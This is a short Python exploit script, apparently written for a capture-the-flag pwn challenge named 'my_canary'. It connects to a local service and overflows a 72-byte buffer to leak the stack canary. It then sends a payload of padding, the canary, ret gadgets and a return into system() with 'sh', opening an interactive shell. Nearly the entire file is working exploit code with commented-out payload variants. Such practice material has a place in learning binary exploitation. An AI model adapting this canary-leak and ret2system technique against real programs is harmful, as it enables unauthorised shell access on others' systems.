from Excalibur2 import *

default('m')
# proc('./strange_system_local')
proc('./my_canary')
remo('127.0.0.1:34451')
# el('strange_system')
debug("b *0x40122C")


system = 0x401490
# system = plt('system')
# ret = 0x000000000040101a
ret = 0x0000000000401016

sd(b'a'*72+b'a')

ru(b'a'*73)
canary = u64(b'\x00'+rec(7))
# canary = (rec(7))
# canary = (rec(7).rjust(b'\x00'))
# canary = int(rec(7).ljust(b'\x00'),16)
pr(canary)
prh(canary)

# pay = b'sh\x00\x00'*6 + p64(canary)+ b'/bin/sh\x00' +p64(system)
# pay = b'sh\x00\x00'*6 + p64(canary)+ b'a'*8 +p64(system)
pay = b'sh\x00\x00' +b'a'*4 + p64(canary)+ b'a'*8 + p64(ret)* 4 + p64(system)
# pay = b'sh\x00\x00'*6 +p64(system)

# debug('b *0x000000000040101a')
sl(pay)

ia()
